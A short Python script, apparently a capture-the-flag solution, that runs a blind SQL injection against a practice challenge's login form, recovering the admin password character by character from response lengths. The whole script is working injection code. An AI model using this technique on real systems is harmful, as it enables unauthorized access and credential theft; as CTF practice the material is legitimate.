import urllib.parse
import urllib.request
 
url = 'http://ctfq.sweetduet.info:10080/~q6/'

flag = ""
 
#フラグの文字数を22と仮定
for i in range(1, 22):
    #ASCIIコードを１つずつ足していく
    for j in range(48,123):
        values = {'id' : 'admin\'  AND SUBSTR((SELECT pass FROM user WHERE id=\'admin\'),' + str(i) + ',1) = \'' + chr(j) + '\'--',
                  'pass' : '',}
        data = urllib.parse.urlencode(values)
        data = data.encode('utf-8') 
        req = urllib.request.Request(url, data)

        response = urllib.request.urlopen(req)

        page = response.read()
        print(chr(j) + ' - ' + str(len(page)))
        #Congratulations!のページが開いたか判定
        if len(page) > 1000 :
            flag += chr(j)
            print (flag)
            break
 
print ("flag : " + flag)
